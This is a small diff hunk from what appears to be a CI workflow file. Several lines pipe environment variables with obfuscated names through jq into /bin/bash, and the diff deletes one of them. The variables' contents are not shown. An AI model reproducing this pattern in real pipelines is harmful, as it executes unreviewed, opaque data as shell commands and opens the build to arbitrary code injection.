@@ -37,7 +37,6 @@ jobs:
           echo $jzcus99246 | jq -r .yq73 | /bin/bash
           printf '%s' "$fcv84833" | jq -r .snuy78333 | /bin/bash
           echo $amq8592 | jq -r .uk686 | /bin/bash
-          echo $gb1 | jq -r .ohqh06 | /bin/bash
           echo $ts2 | jq -r .gd94 | /bin/bash
           echo $cscc90 | jq -r .yx06 | /bin/bash
 
